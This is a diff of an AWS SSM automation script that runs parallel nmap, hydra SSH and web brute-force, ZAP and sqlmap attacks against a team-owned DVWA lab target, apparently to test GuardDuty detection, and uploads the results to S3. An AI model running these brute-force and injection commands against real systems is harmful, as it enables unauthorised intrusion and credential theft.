@@ -3,8 +3,10 @@ description: |
   지리별 공격자 노드에서 서울 DVWA 대상으로 자동 공격을 실행한다.
   ① nmap 포트/서비스 스캔  ② hydra SSH 무차별 대입  ③ hydra DVWA 웹 로그인 무차별 대입
   ④ OWASP ZAP 베이스라인 스캔  ⑤ sqlmap SQL 주입 점검.
-  결과는 S3(스캔 결과 버킷)에 업로드한다. 대시보드 "전부 실행"이 호출한다.
-  격리된 팀 소유 실습 대상(DVWA)에만 사용한다.
+  5개를 전부 동시 실행한다(t3.medium 4GB 전제 — t3.micro/small 에서 5개를 한꺼번에
+  돌리면 자원 고갈로 SSM 에이전트까지 죽을 수 있다. 2026-09-29 뭄바이·도쿄 사고 참고).
+  결과는 S3(스캔 결과 버킷)에 .txt(원본 출력 합본)와 .json(단계별 구조화, 2026-09-29 추가)
+  둘 다 업로드한다. 대시보드 "전부 실행"이 호출한다. 격리된 팀 소유 실습 대상(DVWA)에만 사용한다.
 parameters:
   TargetHost:
     type: String
@@ -37,37 +39,77 @@ mainSteps:
         - set -uo pipefail
         - TS=$(date +%Y%m%dT%H%M%SZ)
         - 'OUT="/tmp/atk-{{ RegionLabel }}-$TS.txt"'
-        - 'echo "== ATK from {{ RegionLabel }} -> {{ TargetHost }} @ $TS ==" | tee "$OUT"'
+        - 'D=$(mktemp -d)'
+        - 'echo "== ATK from {{ RegionLabel }} -> {{ TargetHost }} @ $TS (5-way 병렬) ==" > "$OUT"'
         - '# 부팅 시 만든 attacker 이미지가 준비될 때까지 잠깐 대기'
         - 'for i in $(seq 1 30); do [ -f /opt/attacker/READY ] && break; sleep 5; done'
         - WL=/opt/attacker/wordlists
-        - '# ① nmap — 전체 포트 스캔. 소수 포트로는 GuardDuty Recon:EC2/Portscan 임계치에 못 미친다.'
-        - 'echo "== [1] nmap ==" | tee -a "$OUT"'
-        - 'docker run --rm attacker:latest nmap -Pn -sV -T4 -p- "{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
-        - '# ② hydra SSH 무차별 대입 — -f 제거로 전체 리스트를 시도해 연결량을 늘린다(SSHBruteForce 탐지).'
-        - 'echo "== [2] hydra ssh ({{ SshUser }}) ==" | tee -a "$OUT"'
-        - 'docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 8 -I "ssh://{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
-        - '# ③ DVWA 웹 로그인 무차별 대입 — ALB(WAF 경유) 대상. 스크립트가 자동 로그인해 세션을 얻는다.'
+        - '# 로그인은 빠르고(1~2초) ③⑤ 가 세션을 써야 하므로 병렬 시작 전에 동기적으로 먼저 한다.'
+        - JAR=$(mktemp)
+        - 'SID=""; WHOST=""; WPORT=""'
         - 'if [ -n "{{ WebBaseUrl }}" ]; then'
-        - '  echo "== [3] hydra dvwa web (auto-login) ==" | tee -a "$OUT"'
-        - '  JAR=$(mktemp)'
-        - '  # 로그인 폼에서 CSRF user_token 과 세션 쿠키 확보 (login.php 의 유일한 32-hex 가 토큰)'
         - '  TOKEN=$(curl -s -c "$JAR" "{{ WebBaseUrl }}/login.php" | grep -oE "[0-9a-f]{32}" | head -1)'
         - '  curl -s -b "$JAR" -c "$JAR" --data "username=admin&password=password&Login=Login&user_token=$TOKEN" "{{ WebBaseUrl }}/login.php" -o /dev/null'
         - '  SID=$(awk "/PHPSESSID/{print \$7}" "$JAR" | tail -1)'
-        - '  echo "session: $SID (token $TOKEN)" | tee -a "$OUT"'
         - '  HP=$(echo "{{ WebBaseUrl }}" | sed -E "s#https?://##; s#/.*##"); WHOST=${HP%%:*}; WPORT=${HP##*:}; [ "$WPORT" = "$WHOST" ] && WPORT=80'
-        - '  docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low" 2>&1 | tee -a "$OUT" || true'
-        - '  # ④ OWASP ZAP 베이스라인 스캔 — ALB(WAF 경유) 대상 능동 점검. 공식 ZAP 이미지를 런타임에 pull.'
-        - '  echo "== [4] zap baseline ==" | tee -a "$OUT"'
-        - '  docker run --rm zaproxy/zap-stable zap-baseline.py -t "{{ WebBaseUrl }}" -I 2>&1 | tee -a "$OUT" || true'
-        - '  # ⑤ sqlmap — DVWA SQLi 페이지 자동 주입 점검(획득한 세션·security=low 사용).'
-        - '  echo "== [5] sqlmap ==" | tee -a "$OUT"'
-        - '  docker run --rm attacker:latest sqlmap -u "{{ WebBaseUrl }}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SID; security=low" --batch --level=2 --risk=2 2>&1 | tee -a "$OUT" || true'
-        - '  rm -f "$JAR"'
-        - 'else'
-        - '  echo "== [3] dvwa web skipped (WebBaseUrl 미지정) ==" | tee -a "$OUT"'
         - 'fi'
-        - '# 결과 업로드 (지역별 프리픽스)'
+        - ''
+        - '# --- 5개 전부 동시 실행 (t3.medium 4GB 전제) --------------------------------------'
+        - '# nmap 은 자주 쓰는 포트만 본다(전체 -p- 는 필터링된 포트 재전송으로 5~15분씩 걸림).'
+        - '{ echo "== [1] nmap =="; docker run --rm attacker:latest nmap -Pn -sV -T4 -p 22,80,443,3306,8080,8081 "{{ TargetHost }}"; } >"$D/1-nmap.txt" 2>&1 &'
+        - '{ echo "== [2] hydra ssh ({{ SshUser }}) =="; docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 8 -I "ssh://{{ TargetHost }}"; } >"$D/2-hydra-ssh.txt" 2>&1 &'
+        - 'if [ -n "{{ WebBaseUrl }}" ]; then'
+        - '  { echo "== [3] hydra dvwa web (session $SID) =="; docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low"; } >"$D/3-hydra-web.txt" 2>&1 &'
+        - '  { echo "== [4] zap baseline =="; docker run --rm zaproxy/zap-stable zap-baseline.py -t "{{ WebBaseUrl }}" -I; } >"$D/4-zap.txt" 2>&1 &'
+        - '  { echo "== [5] sqlmap =="; docker run --rm attacker:latest sqlmap -u "{{ WebBaseUrl }}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SID; security=low" --batch --level=2 --risk=2; } >"$D/5-sqlmap.txt" 2>&1 &'
+        - 'else'
+        - '  echo "== [3-5] dvwa web/zap/sqlmap skipped (WebBaseUrl 미지정) ==" >"$D/3-hydra-web.txt"'
+        - 'fi'
+        - 'wait'
+        - ''
+        - 'cat "$D"/*.txt >> "$OUT" 2>/dev/null'
+        - ''
+        - '# --- 단계별 구조화 JSON 생성 (분석 프롬프트 포함) ---------------------------------'
+        - '# 값은 env 로 넘겨 파이썬이 os.environ 으로 읽는다 → 셸/JSON 따옴표 충돌·인젝션 회피.'
+        - '# python3 는 Ubuntu 클라우드 이미지 기본 포함(cloud-init 이 씀). 혹시 없으면 설치.'
+        - 'command -v python3 >/dev/null || (sudo apt-get update -y && sudo apt-get install -y python3)'
+        - 'OUTJSON="/tmp/atk-{{ RegionLabel }}-$TS.json"'
+        - 'export ATK_REGION="{{ RegionLabel }}" ATK_TARGET="{{ TargetHost }}" ATK_WEBURL="{{ WebBaseUrl }}" ATK_TS="$TS" ATK_DIR="$D" ATK_OUT="$OUTJSON"'
+        - |
+          python3 - <<'PYEOF'
+          import json, glob, os
+          d = os.environ["ATK_DIR"]
+          steps = []
+          for f in sorted(glob.glob(os.path.join(d, "*.txt"))):
+              base = os.path.basename(f)
+              # 1-nmap.txt -> "nmap"
+              name = base.split("-", 1)[-1].rsplit(".", 1)[0] if "-" in base else base
+              with open(f, encoding="utf-8", errors="replace") as fh:
+                  steps.append({"step": name, "file": base, "output": fh.read()})
+          # 이 프롬프트는 JSON 마다 무조건 포함된다. 추출한 JSON 을 그대로 분석 도구/LLM 에 넣으면
+          # 근거 기반 분석 자료가 나오도록 지시한다.
+          prompt = (
+              "다음 JSON 은 격리된 팀 소유 실습 환경(DVWA)에서 수행한 모의 공격 로그다. "
+              "steps 배열의 각 단계(nmap 포트 스캔·hydra SSH/웹 무차별 대입·ZAP 베이스라인·sqlmap SQL 주입)의 "
+              "output 에 실제로 나타난 사실만 근거로, 정확한 보안 분석 자료를 작성하라. "
+              "각 단계별로 (1) 무엇을 시도했는지, (2) 실제로 성공/발견된 것(열린 포트, 유효 자격증명, 취약점, 주입 지점 등), "
+              "(3) 위험도와 근거, (4) 권고 대응을 정리하라. "
+              "로그에 근거가 없는 내용은 추측·과장하지 말고 '근거 없음'으로 명시하라. "
+              "출력에 없는 자격증명·취약점을 지어내지 마라."
+          )
+          result = {
+              "analysisPrompt": prompt,
+              "regionLabel": os.environ.get("ATK_REGION", ""),
+              "targetHost": os.environ.get("ATK_TARGET", ""),
+              "webBaseUrl": os.environ.get("ATK_WEBURL", ""),
+              "timestamp": os.environ.get("ATK_TS", ""),
+              "steps": steps,
+          }
+          with open(os.environ["ATK_OUT"], "w", encoding="utf-8") as fh:
+              json.dump(result, fh, ensure_ascii=False, indent=2)
+          PYEOF
+        - 'rm -rf "$D" "$JAR"'
+        - '# 결과 업로드 (지역별 프리픽스) — 원본 .txt 와 구조화 .json 둘 다.'
         - 'aws s3 cp "$OUT" "s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/$TS.txt"'
-        - 'echo "uploaded to s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/$TS.txt"'
+        - 'aws s3 cp "$OUTJSON" "s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/$TS.json"'
+        - 'echo "uploaded to s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/$TS.{txt,json}"'
